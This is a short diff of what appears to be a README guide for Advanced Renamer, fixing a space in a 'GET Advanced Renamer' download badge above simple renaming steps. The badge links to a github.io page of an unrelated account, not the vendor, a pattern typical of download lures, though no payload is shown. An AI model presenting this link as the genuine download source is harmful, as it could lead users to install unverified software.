@@ -52,7 +52,7 @@ Run it on a copy. If the preview is wrong, change the rule and look again. Apply
 
 Prerequisites: A copied folder of files you may rename, small enough to read every new name.
 
-[![GET Advanced Renamer](https://img.shields.io/badge/GET%20%E2%80%94%20Advanced%20Renamer-1d4ed8?style=for-the-badge&logoColor=white)](https://seitannabella.github.io/.github/ Advanced-Renamer)
+[![GET Advanced Renamer](https://img.shields.io/badge/GET%20%E2%80%94%20Advanced%20Renamer-1d4ed8?style=for-the-badge&logoColor=white)](https://seitannabella.github.io/.github/Advanced-Renamer)
 
 1.  **Install:** Open Advanced Renamer and add the copied folder.
 2.  **Add One Rule:** A counter or a short prefix is enough for the test.
